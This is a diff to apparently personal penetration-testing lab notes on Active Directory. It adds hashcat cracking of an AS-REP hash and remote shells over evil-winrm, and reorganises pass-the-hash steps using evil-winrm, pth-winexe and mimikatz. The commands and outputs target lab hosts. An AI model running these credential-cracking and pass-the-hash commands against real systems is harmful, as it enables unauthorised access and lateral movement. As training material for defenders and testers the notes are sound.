@@ -170,7 +170,7 @@ $krb5asrep$23$mike@LAB.VX:16b0315eceaf3c550a69927d62456d9d$821259e1e9980ad1d2fe4
 
 ```console
 ┌──(root㉿kali)-[~]
-└─# time hashcat -m 18200 GetNPUsers.out /usr/share/wordlists/rockyou.txt
+└─# hashcat -m 18200 GetNPUsers.out /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 ⋮
 $krb5asrep$23$mike@LAB.VX:•••hash-truncated•••:P@ssw0rd
@@ -182,10 +182,26 @@ Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
 ⋮
 Started: Wed Dec  7 07:54:16 2022
 Stopped: Wed Dec  7 07:54:44 2022
+```
 
-real    0m28.048s
-user    0m26.413s
-sys     0m0.398s
+## 1.5. Connect to target using evil-winrm
+
+- WinRM `5985` must be enabled on the target
+- User must be a member of `Remote Management Users` on the target
+
+```console
+┌──(root㉿kali)-[~]
+└─# evil-winrm -i 192.168.17.11 -u mike -p P@ssw0rd
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\mike\Documents>
 ```
 
 # 2. Cached Credential Storage and Retrieval
@@ -371,14 +387,35 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1104
 
 # 3. Pass the Hash
 
-☝️ **Note**: LM hashes are not used from Windows 10 onwards, a string of `32 zeros` can used to fill the LM hash portion of the pth-winexe command
+# 3.1. Using evil-winrm
 
-## 3.1. pth-winexe
-- Domain account
+- WinRM `5985` must be enabled on the target
+- User must be a member of `Remote Management Users` on the target
 
 ```console
 ┌──(root㉿kali)-[~]
-└─$ pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
+└─# evil-winrm -i 192.168.17.11 -u domainadmin -H e19ccf75ee54e06b06a5907af13cef42
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\domainadmin\Documents>
+```
+
+## 3.2. Using  pth-winexe
+
+☝️ **Note**: LM hashes are not used from Windows 10 onwards, a string of `32 zeros` can used to fill the LM hash portion of the pth-winexe command
+
+### Domain account
+
+```console
+┌──(root㉿kali)-[~]
+└─$ pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.12 cmd
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH...
 Microsoft Windows [Version 10.0.14393]
@@ -393,11 +430,11 @@ hostname
 SVR
 ```
 
-- Local account
+### Local account
 
 ```console
 ┌──(root㉿kali)-[~]
-└─$ pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
+└─$ pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.12 cmd
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH...
 Microsoft Windows [Version 10.0.14393]
@@ -412,9 +449,9 @@ hostname
 SVR
 ```
 
-## 3.2. mimikatz - sekurlsa::pth
+## 3.3. Using mimikatz - sekurlsa::pth + PsExec
 
-### 3.2.1. Domain account
+### 3.3.1. Domain account
 
 - On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
 - The `sekurlsa::pth` will spawn a new cmd window
@@ -458,7 +495,7 @@ C:\Windows\system32>hostname
 DC
 ```
 
-### 3.2.2. Local account
+### 3.3.2. Local account
 
 - Using `sekurlsa::pth` for local accounts is similar as domain accounts; just use `*` or `workgroup` for the `/domain` option
 
